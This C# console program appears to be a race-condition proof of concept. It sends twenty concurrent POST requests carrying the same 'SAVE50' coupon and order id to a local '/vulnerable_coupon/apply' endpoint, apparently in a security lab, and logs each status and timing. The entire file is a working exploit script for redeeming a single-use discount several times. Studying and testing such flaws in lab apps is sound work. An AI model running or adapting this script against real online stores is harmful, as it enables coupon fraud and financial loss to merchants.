using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

class Program
{
    private static readonly HttpClient Client = new(
        new SocketsHttpHandler { MaxConnectionsPerServer = int.MaxValue })
    { BaseAddress = new Uri("http://localhost:5107") };

    static async Task Main()
    {
        const int N = 20;
        Task[] jobs = new Task[N];
        for (int i = 0; i < N; i++) jobs[i] = Fire(i);
        await Task.WhenAll(jobs);
    }

    static async Task Fire(int id)
    {
        // exact JSON the Burp request sent (int OrderId)
        const string json = "{\"OrderId\":1,\"CouponCode\":\"SAVE50\"}";
        using var content = new StringContent(json, Encoding.UTF8, "application/json");

        var sw = Stopwatch.StartNew();
        var resp = await Client.PostAsync("/vulnerable_coupon/apply", content);
        string body = await resp.Content.ReadAsStringAsync();   // see why it failed
        sw.Stop();

        Console.WriteLine($"[{id}] {(int)resp.StatusCode} in {sw.ElapsedMilliseconds} ms - {body}");
    }
}
